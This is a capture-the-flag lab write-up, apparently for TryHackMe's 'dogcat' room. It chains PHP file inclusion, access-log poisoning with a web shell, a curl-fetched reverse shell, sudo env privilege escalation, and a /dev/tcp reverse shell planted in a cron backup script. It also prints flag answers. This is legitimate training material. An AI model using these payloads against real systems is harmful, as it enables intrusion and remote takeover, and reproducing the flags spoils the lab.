DOGCAT
===
- [x] FLAG1

First, I press F12 want to find any clue, but I don'y find.  
Seccond, I press DOG and CAT button, I got a lot cute picture, and I know **view** only allow dog or cat word.
![image](https://user-images.githubusercontent.com/67756786/195544351-dca3ecb7-941a-4f6d-b731-c2a414ddc0cb.png)

Now I try **php wraper** to take web code.
```
http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog
```

Got a text base on base64.
![image](https://user-images.githubusercontent.com/67756786/195545334-346cbd14-f4cd-4693-a74c-26a52680e9f3.png)

Decode, and then we know cute picture will be readomly picked out of ten.

![image](https://user-images.githubusercontent.com/67756786/195545544-018317ee-f418-41e9-956d-fdaac5b585d7.png)

Now, we try to take /etc/passwd

```
http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd
```
First warring message is talk about path error, and it show us path is dog/../../../../etc/passwd.php.
Obviously, web code should be **include(_GET(view).php)**

![image](https://user-images.githubusercontent.com/67756786/195548462-a80629d6-aa6b-4645-b9ac-78ab62662eba.png)

We use %00 to comment that.
Path is correct but still got error.
![image](https://user-images.githubusercontent.com/67756786/195550444-82fc62ef-cd2c-4f00-ae25-ae96617249cc.png)

Now we need to know that the web how to write.

```
http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../index
```
![image](https://user-images.githubusercontent.com/67756786/195551181-9ca38a4e-946e-4e4f-a94f-7ac00307154e.png)

```html
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>

```

According to index.php source code, we know we have two variable , and we can use GET to change them. 
One of variable, ext, it's default value is .php,No wonder we use /etc/passwd to LFI will get error.

Now we need check /etc/passwd again.
```
http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&ext=
```
work!
![image](https://user-images.githubusercontent.com/67756786/195553839-b10f7fb6-023f-4d19-9844-9ffe524981b8.png)

Then we need to find where can excute RCE vulnerable.  
First, confirm what web server

![image](https://user-images.githubusercontent.com/67756786/195554515-62f65ee8-f2d2-4730-b4f6-4a17e62a6bbf.png)

Second, confirm where apache log file
![image](https://user-images.githubusercontent.com/67756786/195555607-9db42cbd-a824-4ea2-8e19-c1785156e75b.png)

Finaly, try to got apache access.log
```
http://10.10.162.32//?view=dog/../../../../var/log/apache2/access&ext=.log
```
Work, nice!
![image](https://user-images.githubusercontent.com/67756786/195556701-5a70e822-e099-4857-9d17-e43fd7adffd4.png)

Now we try access.log can injection or not.
```
echo -e "GET <?php phpinfo(); ?>"| nc 10.10.162.32 80
```
Work
![image](https://user-images.githubusercontent.com/67756786/195557135-6a978839-dad3-4fdd-a902-765dc8206e2f.png)

Now I want put web shell into that.
```
echo -e "GET <?php if(isset($_GET['cmd']))  {  system($_GET['cmd']);  }?>" | nc 10.10.162.32 80
```
But I got this error message, and then I reboot target machine.
![image](https://user-images.githubusercontent.com/67756786/195541111-f95d8e1f-1e61-4993-8f85-7c2c0fa74aa2.png)

And then I think that I just want to print result of excution, after that I change my RCE code.

```
 echo -e "<?php system(\$_GET[B]); ?>" | nc 10.10.142.129 80
```

Success!
![image](https://user-images.githubusercontent.com/67756786/195745918-9ef79f1d-3981-4432-8764-c8382e9c0e56.png)

Now we need to uplode php reverse shell and excute it.  
First, uploade php revere shell, we can use python http server and use curl dowload reverse shell.
Second, excute this reverse shell.
php reverse shell(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)  
If you reverse shell is ready, we can open python http server
![image](https://user-images.githubusercontent.com/67756786/195754923-4cc04d9b-d523-4f31-902c-e1e562060afb.png)

After, we dowload and excute that.  
Dowload
```
http://10.10.142.129/?ext=&view=dog/../../../../var/log/apache2/access.log&B=curl -o /var/www/html/s.php%20http://10.10.180.17/shell.php
```
Excute
```
http://10.10.142.129/?view=dog/../s
```
But, got a error message, seem to be not use this method.

![image](https://user-images.githubusercontent.com/67756786/195755156-0699cb87-02fe-46af-a4b0-3a09d01d1eb2.png)

One day ago, I conscious my dowload URL is error, default port of python http server is 8000.  
Later, I do it again, same method, and work!

revereshell
![image](https://user-images.githubusercontent.com/67756786/195756571-aa5bc548-2fcc-4a9c-a1e6-e935aef44fcd.png)

Now, we need to got four flag! I will use `find` to search flag

```
find * -name flag*
```

![image](https://user-images.githubusercontent.com/67756786/195767056-726c156b-0903-4424-9604-1396ff6c6123.png)

and open that.

![image](https://user-images.githubusercontent.com/67756786/195767322-991d0302-a03d-4ac1-b2b5-c240764b1bea.png)


- [x] FLAG2

![image](https://user-images.githubusercontent.com/67756786/195767344-8ca50948-1b04-47c2-bf49-1986efa95617.png)

- [x] FLAG3

Usually, one of flag will be on the root dictory,and then we confirm www_data to can be root or not.
```
sudo -l
```
![image](https://user-images.githubusercontent.com/67756786/195769614-9a3adb49-accb-4f09-8af0-1507d7717aaa.png)

GTFOBins have privilege escalation method by env

![image](https://user-images.githubusercontent.com/67756786/195769742-863b904a-d754-4b83-ba55-24c5c3f5ae07.png)

![image](https://user-images.githubusercontent.com/67756786/195769806-8fe8bd4c-866b-4219-944f-d3ddfd1b566e.png)

flag3 into /root dictory

![image](https://user-images.githubusercontent.com/67756786/195770951-3eaf770f-00a9-4264-a973-da4db5812396.png)


- [x] FLAG4

在/目錄底下，我發現隱藏目錄.dockerenv，所以目前應該是container環境
![image](https://user-images.githubusercontent.com/67756786/195786709-0f4a8036-b4a2-41a2-9ecd-619922b00f87.png)

接著在opt中發現bakcup目錄
![image](https://user-images.githubusercontent.com/67756786/195787001-f3465ed3-1557-4bfb-87b6-bd20aecaba10.png)

backup.sh內容為`tar cf /root/container/backup/backup.tar /root/container`

backup.tar解壓縮後有root/container/目錄，底下有Dockerfile、backup.sh、launch.sh
Dockerfile
```docker
FROM php:apache-buster

# Setup document root
RUN mkdir -p /var/www/html

# Make the document root a volume
VOLUME /var/www/html

# Add application
WORKDIR /var/www/html
COPY --chown=www-data src/ /var/www/html/

RUN rm /var/log/apache2/*.log

# Set up escalation
RUN chmod +s `which env`
RUN apt-get update && apt-get install sudo -y
RUN echo "www-data ALL = NOPASSWD: `which env`" >> /etc/sudoers

# Write flag
RUN echo "THM{D1ff3r3nt_3nv1ronments_874112}" > /root/flag3.txt
RUN chmod 400 /root/flag3.txt

RUN echo "THM{LF1_t0_RC3_aec3fb}" > /var/www/flag2_QMW7JvaY2LvK.txt

EXPOSE 80

# Configure a healthcheck to validate that everything is up&running
HEALTHCHECK --timeout=10s CMD curl --silent --fail http://127.0.0.1:80/
```
launch.sh
```
#!/bin/bash
docker run -d -p 80:80 -v /root/container/backup:/opt/backups --rm box
```
接著更改backup.sh
```
echo "echo "#!/bin/bash \n bash -i >& /dev/tcp/10.10.180.17/4242 0>&1" > backup.sh"
```
監聽4242 port後會發現取得shell，並且為root權限，查看flag4.txt
![image](https://user-images.githubusercontent.com/67756786/195788139-a9d0dad3-3a25-45a8-8eab-423e0686af69.png)

確認crontab
```
corntab -l
```
![image](https://user-images.githubusercontent.com/67756786/195788238-83b05236-ba54-4743-87e0-b6f9447a552f.png)
